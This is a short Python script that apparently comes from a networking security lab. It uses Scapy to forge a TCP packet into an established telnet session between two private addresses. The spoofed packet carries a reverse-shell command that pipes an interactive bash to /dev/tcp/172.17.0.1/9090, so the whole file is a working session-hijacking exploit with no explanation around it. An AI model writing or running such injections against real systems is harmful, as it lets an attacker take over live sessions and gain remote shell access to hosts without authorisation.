#!/usr/bin/env python3 
from scapy.all import * 

ip = IP(src="10.9.0.6", dst="10.9.0.5") 
tcp = TCP(sport=41104, dport=23, flags="A", seq=2579159467, ack=2486961702) 
data = "\r /bin/bash -i > /dev/tcp/172.17.0.1/9090 0<&1 2>&1\r" 
pkt = ip/tcp/data 
ls(pkt) 
send(pkt, verbose=0)